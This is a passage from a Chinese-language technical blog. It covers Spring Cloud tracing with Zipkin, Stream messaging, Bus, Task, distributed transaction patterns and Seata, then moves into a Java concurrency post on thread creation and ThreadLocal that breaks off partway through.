<li><strong>cs</strong>: Client Sent. The client has made a request. This annotation indicates the start of the span.</li>
<li><strong>sr</strong>: Server Received: The server side got the request and started processing it. Subtracting the <code>cs</code> timestamp from this timestamp reveals the network latency.</li>
<li><strong>ss</strong>: Server Sent. Annotated upon completion of request processing (when the response got sent back to the client). Subtracting the <code>sr</code> timestamp from this timestamp reveals the time needed by the server side to process the request.</li>
<li><strong>cr</strong>: Client Received. Signifies the end of the span. The client has successfully received the response from the server side. Subtracting the <code>cs</code> timestamp from this timestamp reveals the whole time needed by the client to receive the response from the server.</li>
</ul>
<h2 id="Zipkin"><a href="#Zipkin" class="headerlink" title="Zipkin"></a>Zipkin</h2><h3 id="功能-6"><a href="#功能-6" class="headerlink" title="功能"></a>功能</h3><p>Zipkin是分布式实时数据追踪系统，由Twitter公司开发。主要功能是聚集来自各系统的实时监控数据。</p>
<p>主要由四部分组成：</p>
<ol>
<li>收集器：收集追踪数据。</li>
<li>数据存储：数据存储默认使用内存存储，也可以替换成MySQL、Cassandra等。</li>
<li>查询：向其它服务服务提供数据查询功能</li>
<li>Web页面</li>
</ol>
<h3 id="使用方法-10"><a href="#使用方法-10" class="headerlink" title="使用方法"></a>使用方法</h3><ol>
<li>创建Zipkin Server、<ol>
<li>添加pom依赖zipkin-autoconfigure-ui和zipkin-server；</li>
<li>在启动类中添加@EnableZipkinServer，表示启动Zipkin服务端。</li>
</ol>
</li>
<li>在服务中添加依赖和配置：<ol>
<li>添加对Sleuth的依赖spring-cloud-starter-sleuth（生成带有spanId和traceId的日志）和spring-cloud-sleuth-zipkin（将日志以HTTP协议传输到Zipkin Server）</li>
<li>配置zipkin的base-url（Zipkin Server的地址）、sleuth的samper.percentage（创建并传输日志的传输比例）</li>
</ol>
</li>
</ol>
<h3 id="整合Stream"><a href="#整合Stream" class="headerlink" title="整合Stream"></a>整合Stream</h3><p>由于将日志传输到Zipkin Server的方式是HTTP请求，请求量太大时会给系统带来很大压力，如果改为使用Stream消息机制传输监控日志就可以减轻压力。</p>
<p>Zipkin与Spring Cloud Stream整合的方法是：</p>
<ol>
<li>在Zipkin Server端<ol>
<li>添加对Stream消息中间件的依赖（以RabbitMQ为例）：spring-cloud-sleuth-zipkin-stream；spring-cloud-sleuth-stream；spring-cloud-stream-binder-rabbit。</li>
<li>在配置文件中添加对Stream的配置信息和RabbitMQ的连接信息。</li>
<li>将Zipkin Server的启动类注解@EnableZipkinServer改为@EnableZipkinStreamServer。</li>
</ol>
</li>
<li>在服务端<ol>
<li>将spring-cloud-sleuth-zipkin依赖注掉，在此基础上添加spring-cloud-sleuth-stream和spring-cloud-stream-binder-rabbit依赖。</li>
<li>和在Zipkin Server端一样，配置文件中添加对Stream的配置信息和RabbitMQ的连接信息。</li>
</ol>
</li>
</ol>
<h3 id="整合MySQL"><a href="#整合MySQL" class="headerlink" title="整合MySQL"></a>整合MySQL</h3><p>Zipkin默认将数据存储在内存中，如果要持久化这些数据可以整合MySQL.</p>
<p>Zipkin与MySQL整合的方法是：</p>
<ol>
<li>添加对JDBC和MySQL驱动的依赖，spring-boot-starter-jdbc和mysql-connector-java</li>
<li>在配置文件中配置MySQL的连接信息，设置initialize参数为true（在启动时创建表结构  ）</li>
</ol>
<h1 id="消息驱动"><a href="#消息驱动" class="headerlink" title="消息驱动"></a>消息驱动</h1><h2 id="Stream"><a href="#Stream" class="headerlink" title="Stream"></a>Stream</h2><h3 id="功能和概念"><a href="#功能和概念" class="headerlink" title="功能和概念"></a>功能和概念</h3><p>在企业级应用中处理非同步场景、消息通知、应用间解耦等场景经常会使用消息中间件，常见的消息中间件有如，ActiveMQ、RabbitMQ、MetaMQ、Kafka、Redis等。</p>
<p><a target="_blank" rel="noopener" href="https://spring.io/projects/spring-cloud-stream">Spring Cloud Stream</a>是一个构建事件驱动或消息驱动微服务的框架，提供了一个灵活的编程模型，该模型建立在已经建立和熟悉的 Spring 习惯用法和最佳实践之上，包括对持久发布&#x2F;订阅语义、消费者组和有状态分区的支持。</p>
<p>利用Stream可以对消息中间件实现进一步的封装，使代码更具有通用性，降低项目对消息中间件的耦合。更重要的是这一就可以方便地实现消息中间件的混用，比如生产者使用Kafka，消费者使用RabbitMQ。</p>
<p>Stream目前支持的中间件：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/spring-cloud/spring-cloud-stream-binder-rabbit">RabbitMQ</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/spring-cloud/spring-cloud-stream-binder-kafka">Apache Kafka</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/spring-cloud/spring-cloud-stream-binder-kafka/tree/master/spring-cloud-stream-binder-kafka-streams">Kafka Streams</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/spring-cloud/spring-cloud-stream-binder-aws-kinesis">Amazon Kinesis</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/spring-cloud/spring-cloud-gcp/tree/master/spring-cloud-gcp-pubsub-stream-binder">Google PubSub <em>(partner maintained)</em></a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/SolaceProducts/spring-cloud-stream-binder-solace">Solace PubSub+ <em>(partner maintained)</em></a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Azure/azure-sdk-for-java/tree/main/sdk/spring/spring-cloud-azure-stream-binder-eventhubs">Azure Event Hubs <em>(partner maintained)</em></a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Azure/azure-sdk-for-java/tree/main/sdk/spring/spring-cloud-azure-stream-binder-servicebus">Azure Service Bus <em>(partner maintained)</em></a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/idealo/spring-cloud-stream-binder-sqs">AWS SQS <em>(partner maintained)</em></a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/idealo/spring-cloud-stream-binder-sns">AWS SNS <em>(partner maintained)</em></a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/alibaba/spring-cloud-alibaba/wiki/RocketMQ-en">Apache RocketMQ <em>(partner maintained)</em></a></li>
</ul>
<p>概念：</p>
<ul>
<li><em>Bindings</em>（绑定）：是一组接口，以声明方式标识输入和输出通道。在<code>@EnableBinding</code>注解中，你可以指定要绑定的通道集合。</li>
<li><em>Binder</em>（绑定器）：是消息中间件的实现，例如Kafka或RabbitMQ。绑定器负责将应用程序与特定的消息中间件进行连接和通信。</li>
<li><em>Channel</em>（通道）：代表消息中间件与应用程序之间的通信管道。通道可以是输入通道（用于接收消息）或输出通道（用于发送消息）。</li>
<li><em>StreamListeners</em>（流监听器）：是在Bean中定义的用于处理消息的方法。这些方法会自动在通道上接收到消息后被调用。在调用之前，消息转换器（MessageConverter）会执行消息的序列化和反序列化操作，将消息转换为中间件特定的事件和领域对象类型&#x2F;POJO之间进行转换。</li>
<li><em>Message Schemas</em>（消息模式）：用于消息的序列化和反序列化的模式。消息模式可以静态地从位置读取或动态加载，支持领域对象类型的演进。消息模式可以确保消息在不同系统之间的一致性和互操作性。</li>
</ul>
<h3 id="使用方法（以RabbitMQ为例）"><a href="#使用方法（以RabbitMQ为例）" class="headerlink" title="使用方法（以RabbitMQ为例）"></a>使用方法（以RabbitMQ为例）</h3><ol>
<li>启动RabbitMQ服务，比如可以使用Docker启动RabbitMQ</li>
<li>建两个Maven项目，分别作为消息的生产者和消费者</li>
<li>均添加依赖spring-cloud-starter-stream（对Streram的依赖）和spring-cloud-starter-stream-rabbit（对RabbitMQ的依赖）。</li>
<li>在消费者增加配置，配置消费的消息信息和RabbitMQ服务的信息</li>
<li>在消费者启动类上添加@EnableBinding(BindingsInterface.class)，该注解表示为该Spring Boot项目增加Stream通道监听功能。BindingsInterface可以是sink、source、processor或三者的组合：<ol>
<li>sink：只带有输入通道的应用</li>
<li>source：只带有输出通道应用</li>
<li>processor：带有输入通道和输出通道的应用</li>
</ol>
</li>
<li>创建BindingsInterface接口</li>
</ol>
<h1 id="消息总线"><a href="#消息总线" class="headerlink" title="消息总线"></a>消息总线</h1><h2 id="Bus"><a href="#Bus" class="headerlink" title="Bus"></a>Bus</h2><h3 id="功能-7"><a href="#功能-7" class="headerlink" title="功能"></a>功能</h3><p>Bus的一个常用功能是进行配置中心客户端的刷新。当Git Repository改变时，Bus会通过POST请求Config Server的&#x2F;bus&#x2F;refresh，Config Server会从Repository获取最新的信息并传递给Client。通过&#x2F;bus&#x2F;refresh的destination参数可以指定刷新某一台Client实例。</p>
<p>Bus的配置刷新通知功能是基于Spring的事件机制实现的，这些事件是可追踪的。</p>
<h1 id="短生命微服务"><a href="#短生命微服务" class="headerlink" title="短生命微服务"></a>短生命微服务</h1><h2 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h2><h3 id="功能-8"><a href="#功能-8" class="headerlink" title="功能"></a>功能</h3><p><a target="_blank" rel="noopener" href="https://spring.io/projects/spring-cloud-task">官方对Spring Cloud Task的介绍</a>十分简单明了：Spring Cloud Task allows a user to develop and run short lived microservices using Spring Cloud and run them locally, in the cloud, even on Spring Cloud Data Flow. Just add <code>@EnableTask</code> and run your app as a Spring Boot app (single application context).</p>
<p>Task用于支持短生命周期的微服务，该类微服务常见于定时任务、批处理等场景。</p>
<h3 id="使用方法-11"><a href="#使用方法-11" class="headerlink" title="使用方法"></a>使用方法</h3><ol>
<li>添加依赖spring-cloud-task-core</li>
<li>在启动类添加@EnableTask注解</li>
</ol>
<p>Task默认将Task生命周期记录在内存中，可以和数据库集成将其存储到数据库中。 </p>
<p>Task可以通过Stream启动，实现方法是在Task项目中创建一个Sink来监听包含TaskLaunchRequest的消息实现的。</p>
<h1 id="分布式事务"><a href="#分布式事务" class="headerlink" title="分布式事务"></a><a target="_blank" rel="noopener" href="https://juejin.cn/post/6844903647197806605">分布式事务</a></h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><h3 id="ACID"><a href="#ACID" class="headerlink" title="ACID"></a>ACID</h3><p>说到数据库事务就不得不说，数据库事务中的四大特性，ACID:</p>
<ul>
<li><p>A（Atomicity，原子性）：事务作为一个整体被执行，要么全部成功，要么全部失败。</p>
</li>
<li><p>C（Consistency，一致性）：事务执行之前和执行之后数据（如数据库中的数据）都必须处于一致性状态。</p>
<p>如果事务成功地完成，那么系统中所有变化将正确地应用，系统处于有效状态。如果在事务中出现错误，那么系统中的所有变化将自动地回滚，系统返回到原始状态。</p>
</li>
<li><p>I（Isolation，隔离性）：一个事务的中间状态对其他事务是不可见的。</p>
</li>
<li><p>D（Durability，持久性）：事务成功完成后，即使在系统出现故障时，对数据的更改仍然存在并且不会撤消。</p>
</li>
</ul>
<h3 id="BASE"><a href="#BASE" class="headerlink" title="BASE"></a>BASE</h3><p>BASE理论是Basically Available(基本可用)，Soft State（软状态）和Eventually Consistent（最终一致性）三个短语的缩写。</p>
<p>其核心思想是：</p>
<blockquote>
<p>既是无法做到强一致性（Strong consistency），但每个应用都可以根据自身的业务特点，采用适当的方式来使系统达到最终一致性（Eventual consistency）。</p>
</blockquote>
<h3 id="分布式事务解决方案"><a href="#分布式事务解决方案" class="headerlink" title="分布式事务解决方案"></a>分布式事务解决方案</h3><h4 id="2PC"><a href="#2PC" class="headerlink" title="2PC"></a>2PC</h4><p>2PC（两阶段提交协议）将事务分成两个阶段：</p>
<ul>
<li><p>准备阶段（Prepare Phase）:事务管理器给每个参与者发送Prepare消息，每个数据库参与者在本地执行事务，并写本地的Undo&#x2F;Redo日志，此时事务没有提交。</p>
<p>Undo log是记录修改前的数据，用于数据库回滚，Redo log记录修改后的数据，用于提交事务后写入数据的文件。</p>
</li>
<li><p>提交阶段（Commit Phase）:如果事务管理器收到了参与者的执行失败或者超时消息时，直接给每个参与者发送回滚（Rollback）消息；否则发送提交（Commit）消息。参与者根据事务管理器指令进行提交或者回滚操作，并释放事务处理过程中使用的资源。</p>
</li>
</ul>
<h4 id="TCC"><a href="#TCC" class="headerlink" title="TCC"></a>TCC</h4><p>TCC将事务分成三个阶段：</p>
<ol>
<li>Try阶段（Try）：对业务系统进行检测及预留资源。</li>
<li>确认阶段（Confirm）：对业务做确认提交。</li>
<li>撤销阶段（Cancel）：撤销事务。</li>
</ol>
<p>TCC采用的是补偿机制，核心思想是针对每个操作，都要编写一个与其对应的确认和补偿（撤销）操作逻辑。</p>
<h2 id="Seata"><a href="#Seata" class="headerlink" title="Seata"></a><a target="_blank" rel="noopener" href="https://seata.io/zh-cn/docs/overview/what-is-seata.html">Seata</a></h2><p>Seata 是一款开源的分布式事务解决方案，致力于提供高性能和简单易用的分布式事务服务。</p>
<h3 id="Seata术语"><a href="#Seata术语" class="headerlink" title="Seata术语"></a>Seata术语</h3><ul>
<li>TC (Transaction Coordinator) - 事务协调者 - Seata Server</li>
</ul>
<p>维护全局和分支事务的状态，驱动全局事务提交或回滚。</p>
<ul>
<li>TM (Transaction Manager) - 事务管理器</li>
</ul>
<p>定义全局事务的范围：开始全局事务、提交或回滚全局事务。</p>
<ul>
<li>RM (Resource Manager) - 资源管理器</li>
</ul>
<p>管理分支事务处理的资源，与TC交谈以注册分支事务和报告分支事务的状态，并驱动分支事务提交或回滚。</p>
<h3 id="事务模式"><a href="#事务模式" class="headerlink" title="事务模式"></a>事务模式</h3><p>Seata 将为用户提供了 AT、TCC、SAGA 和 XA 事务模式。</p>
<h4 id="AT-模式"><a href="#AT-模式" class="headerlink" title="AT 模式"></a><a target="_blank" rel="noopener" href="https://seata.io/zh-cn/blog/seata-at-lock.html#:~:text=Seata%20AT%20%E6%A8%A1%E5%BC%8F%E6%98%AF%E4%B8%80,%E6%97%A5%E5%BF%97%EF%BC%8C%E6%A3%80%E6%9F%A5%E5%85%A8%E5%B1%80%E9%94%81%E7%AD%89%E3%80%82">AT 模式</a></h4><p>Seata AT 模式是一种非侵入式的分布式事务解决方案，Seata 在内部做了对数据库操作的代理层，我们使用 Seata AT 模式时，实际上用的是 Seata 自带的数据源代理 DataSourceProxy，Seata 在这层代理中加入了很多逻辑，比如插入回滚 undo_log 日志，检查全局锁等。</p>
<p>AT 模式是2PC的演变：</p>
<ol>
<li><p>一阶段</p>
<p>在一阶段中，Seata会拦截“业务SQL”，首先解析SQL语义，找到要更新的业务数据，在数据更新前，保存下”undo log”，然后执行“业务SQL”更新数据，更新之后保存数据“redo log”，最后生成锁，这些操作都是在本地数据库事务内完成，这样保证了一阶段的原子性。</p>
</li>
<li><p>二阶段</p>
<p>相对一阶段，二阶段比较简单，负责整体的回滚和提交，如果之前的一阶段中有本地事务没有通过吗，那么就执行全局回滚，否则执行全局提交，回滚用到的就是一阶段记录的“undo log”，通过回滚记录生成反向更新SQL并执行，已完成分支事务的回滚，当然事务完成后释放所有资源和删除所有日志。</p>
</li>
</ol>
<p>性能：高</p>
<p>模式:：AP，存在数据不一致的中间状态</p>
<p>难易程度：简单，靠SEATA自己解析反向SQL并回滚</p>
<p>使用要求：</p>
<ul>
<li>所有服务与数据库必须要自己拥有管理权，因为要创建UNDO_LOG表</li>
</ul>
<p>应用场景：</p>
<ul>
<li>高并发互联网应用，允许数据出现短时不一致，可通过对账程序或补录来保证最终一致性。</li>
</ul>
<h4 id="TCC模式"><a href="#TCC模式" class="headerlink" title="TCC模式"></a>TCC模式</h4><p>TCC是Try-尝试、Confirm-确认、Cancel-取消Try尝试阶段，对资源进行锁定。Confirm 确认阶段，对资源进行确认，完成操作Cancel 取消阶段，对资源进行还原，取消操作</p>
<p>实现原理</p>
<ul>
<li>在代码与数据表中扩展字段，实现对数据资源的锁定。</li>
</ul>
<p>性能：好</p>
<p>模式：AP，存在数据不一致的中间状态</p>
<p>难易程度：复杂，SEATATC只负责全局事务的提交与回滚指令，具体的回滚处理全靠程序员自己实现</p>
<p>使用要求：</p>
<ul>
<li><p>所有服务与数据库必须要自己拥有管理权</p>
</li>
<li><p>支持异构数据库，可以使用不同选型实现</p>
</li>
</ul>
<p>应用场景：</p>
<ul>
<li>高并发互联网应用，允许数据出现短时不一致，于对账程序或补录来保证最终一致性。</li>
</ul>
<h4 id="SAGA模式"><a href="#SAGA模式" class="headerlink" title="SAGA模式"></a>SAGA模式</h4><p>Saga模式是SEATA提供的长事务解决方案，在Saga模式中，业务流程中每个参与者都提交本地事务，当出现某一个参与者失败，则补偿前面已经成功的参与者，一阶段的正向服务和二阶段的补偿服务都由业务开发实现。</p>
<p>性能：不一定，取决于三方服务</p>
<p>模式：AP，存在数据不一致的中间状态</p>
<p>难易程度：复杂，提交与回滚流程全靠程序员编排</p>
<p>使用要求：</p>
<ul>
<li><p>在当前架构引入状态机机制，类似于工作流</p>
</li>
<li><p>无法保证隔离性</p>
</li>
</ul>
<p>应用场景：</p>
<ul>
<li>需要与第三方交互时才会考虑，例如:调用支付宝支付接口→出库失败-&gt;调用支付宝退款接口</li>
</ul>
<h4 id="XA模式"><a href="#XA模式" class="headerlink" title="XA模式"></a>XA模式</h4><p>基于数据库的XA协议来实现2PC又称为XA方案。</p>
<p>性能：低</p>
<p>模式：CP，强一致性</p>
<p>难易程度：简单，基于数据库自带特性实现，无需改表</p>
<p>使用要求：</p>
<ul>
<li>使用支持XA方案的关系型数据库（(主流都支持)</li>
</ul>
<p>应用场景：</p>
<ul>
<li>金融行业，并发量不大，但数据很重要的项目</li>
</ul>
<h3 id="使用方法-12"><a href="#使用方法-12" class="headerlink" title="使用方法"></a>使用方法</h3><p>以AT模式为例：</p>
<ol>
<li>创建undo_log日志</li>
<li>对Seata两个主要的配置文件file.config和registry.config</li>
<li>添加pom依赖seata-spring-boot-starter</li>
<li>在需要开启分布式事务的业务方法上添加注解@GlobalTransactional</li>
</ol>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul>
<li><p>胡劲寒. 极简Spring Cloud实战. 北京: 机械工业出版社, 2019.</p>
</li>
<li><p>开课吧,李伟杰,刘雪松,刘自强,王超. Spring Cloud Alibaba微服务开发从入门到实战.</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/alibaba/spring-cloud-alibaba/wiki/Sentinel">https://github.com/alibaba/spring-cloud-alibaba/wiki/Sentinel</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://spring-cloud-alibaba-group.github.io/github-pages/hoxton/en-us/index.html">https://spring-cloud-alibaba-group.github.io/github-pages/hoxton/en-us/index.html</a></p>
</li>
</ul>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2023-05-07T13:39:13.000Z" title="2023/5/7 21:39:13">2023-05-07</time></span><span class="level-item">Updated&nbsp;<time dateTime="2023-05-30T03:31:54.565Z" title="2023/5/30 11:31:54">2023-05-30</time></span><span class="level-item">3 hours read (About 24634 words)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2023/05/07/Java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/">Java并发编程</a></p><div class="content"><h1 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h1><h2 id="线程的创建方式"><a href="#线程的创建方式" class="headerlink" title="线程的创建方式"></a>线程的创建方式</h2><p>Java 中创建线程的方法有四种：继承 Thread 类、实现 Runnable 接口、实现 Callable 接口并使用FutureTask类以及通过线程池创建线程。</p>
<ol>
<li>继承 Thread 类：</li>
</ol>
<p>继承 Thread 类是创建线程最简单的方式，在该类中重写 run() 方法即可实现线程的执行逻辑。可以通过 start() 方法启动线程，如下所示：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyThread</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Thread</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">// 实现线程执行逻辑</span><br>    &#125;<br>&#125;<br><span class="hljs-type">MyThread</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyThread</span>();<br>thread.start();<br></code></pre></td></tr></table></figure>

<ol start="2">
<li>实现 Runnable 接口：</li>
</ol>
<p>实现 Runnable 接口也是一种常见的创建线程的方式，可以将 Runnable 对象传递给 Thread 类，通过 start() 方法启动线程，如下所示：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyRunnable</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Runnable</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">// 实现线程执行逻辑</span><br>    &#125;<br>&#125;<br><span class="hljs-type">MyRunnable</span> <span class="hljs-variable">runnable</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyRunnable</span>();<br><span class="hljs-type">Thread</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(runnable);<br>thread.start();<br></code></pre></td></tr></table></figure>

<ol start="3">
<li>实现 Callable 接口并使用FutureTask类：</li>
</ol>
<p>与 Runnable 接口相比，Callable 接口可以返回执行结果，并且可以抛出异常。</p>
<p>但是Callable接口实例不能作为Thread类的target，所以还需要一个搭桥接口，RunnableFuture接口就是Thread和Callable之间的“搭桥接口”。RunnableFuture继承了Runnable接口和Future接口。其中Future接口提供的功能有取消执行中的任务、获取任务的执行结果等。</p>
<p>FutureTask类实现了RunnableFuture接口。</p>
<p>使用方法如下所示：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyCallable</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Callable</span>&lt;String&gt; &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">call</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        System.out.println(<span class="hljs-string">&quot;calling&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;this is the result of the execute&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    <span class="hljs-type">MyCallable</span> <span class="hljs-variable">myCallable</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyCallable</span>();<br>    FutureTask&lt;String&gt; futureTask = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FutureTask</span>&lt;&gt;(myCallable);<br>    <span class="hljs-type">Thread</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(futureTask);<br>    thread.start();<br>    <span class="hljs-keyword">try</span> &#123;<br>        System.out.println(futureTask.get()); <span class="hljs-comment">// 获取任务的执行结果</span><br>    &#125; <span class="hljs-keyword">catch</span> (InterruptedException | ExecutionException e) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>    &#125;<br>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">输出结果：</span><br><span class="hljs-comment">    calling</span><br><span class="hljs-comment">    this is the result of the execute</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure>

<ol start="4">
<li>通过线程池创建线程</li>
</ol>
<h2 id="线程局部变量"><a href="#线程局部变量" class="headerlink" title="线程局部变量"></a>线程局部变量</h2><p>线程局部变量有两种，ThreadLocal和InheritableThreadLocal，其中ThreadLocal在主线程和子线程之间不具备可继承性，而InheritableThreadLocal具备可继承。</p>
<h3 id="ThreadLocal"><a href="#ThreadLocal" class="headerlink" title="ThreadLocal"></a>ThreadLocal</h3><p><code>ThreadLocal</code>由一个线程的类型为<code>ThreadLocal.ThreadLocalMap</code>的对象<code>threadlocals</code>来保存，<code>ThreadLocalMap</code>是<code>ThreadLocal</code>类的内部类。具体来说，在<code>ThreadLocalMap</code>中，set到<code>ThreadLocal</code>对象的值作为值（value），<code>ThreadLocal</code>对象作为键（key），并且key是一个弱引用。</p>
<p>因为ThreadLocal对象（key）是一个弱引用，所以当线程销毁后，由于ThreadLocal对象不再被强引用，所以ThreadLocal对象可以被垃圾回收。但是threadlocals中依然存在键值对，所以为了避免内存溢出，还是需要手动移除（remove）ThreadLocal对象。</p>
<p>ThreadLocal的使用方法示例：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">ThreadLocal&lt;String&gt; threadLocal = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadLocal</span>&lt;&gt;(); <span class="hljs-comment">//创建一个用于存储String类型的ThreadLocal变量</span><br>threadLocal.set(<span class="hljs-string">&quot;Hello, ThreadLocal!&quot;</span>); <span class="hljs-comment">//设置当前线程的ThreadLocal变量值</span><br><span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> threadLocal.get(); <span class="hljs-comment">//返回当前线程的ThreadLocal变量值</span><br>threadLocal.remove(); <span class="hljs-comment">//清除当前线程的ThreadLocal变量值</span><br></code></pre></td></tr></table></figure>

<p>可以创建多个ThreadLocal实例，每个ThreadLocal实例可以用来存储一个特定的值，例如，可以创建两个ThreadLocal实例来存储不同类型的值：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">ThreadLocal&lt;String&gt; threadLocal1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadLocal</span>&lt;&gt;(); <span class="hljs-comment">//创建一个用于存储String类型的ThreadLocal变量</span><br>ThreadLocal&lt;Integer&gt; threadLocal2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadLocal</span>&lt;&gt;(); <span class="hljs-comment">//创建一个用于存储Integer类型的ThreadLocal变量</span><br></code></pre></td></tr></table></figure>

<h3 id="InheritableThreadLocal"><a href="#InheritableThreadLocal" class="headerlink" title="InheritableThreadLocal"></a>InheritableThreadLocal</h3><p>使用InheritableThreadLocal创建对象保存的变量具有继承性，子线程调用该对象的get方法可以获取到父线程set到该对象中的值。父线程是创建和启动子线程的线程。</p>
<p>InheritableThreadLocal的使用方法示例：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> InheritableThreadLocal&lt;String&gt; INHERITABLE_THREAD_LOCAL = <span class="hljs-keyword">new</span> <span class="hljs-title class_">InheritableThreadLocal</span>&lt;&gt;();<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    INHERITABLE_THREAD_LOCAL.set(<span class="hljs-string">&quot;主线程保存的值&quot;</span>);<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> INHERITABLE_THREAD_LOCAL.get();<br>    System.out.println(<span class="hljs-string">&quot;子线程中访问主线程中保存的局部变量值：&quot;</span> + value);<br>    &#125;).start();<br>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">输出结果：</span><br><span class="hljs-comment">	子线程中访问主线程中保存的局部变量值：主线程保存的值</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure>

<p>通过InheritableThreadLocal对象之所以能够访问到父（parent）线程的inheritableThreadLocals，是因为在创建线程的时候，会将parent线程的inheritableThreadLocals复制一份到子线程的inheritableThreadLocals中。</p>
<h2 id="线程状态"><a href="#线程状态" class="headerlink" title="线程状态"></a>线程状态</h2><h2 id="线程方法"><a href="#线程方法" class="headerlink" title="线程方法"></a>线程方法</h2><h3 id="sleep"><a href="#sleep" class="headerlink" title="sleep"></a>sleep</h3><p>在Java和许多其他编程语言中，线程的<code>sleep()</code>方法并不会导致线程释放锁，但是不会阻塞其他线程。</p>
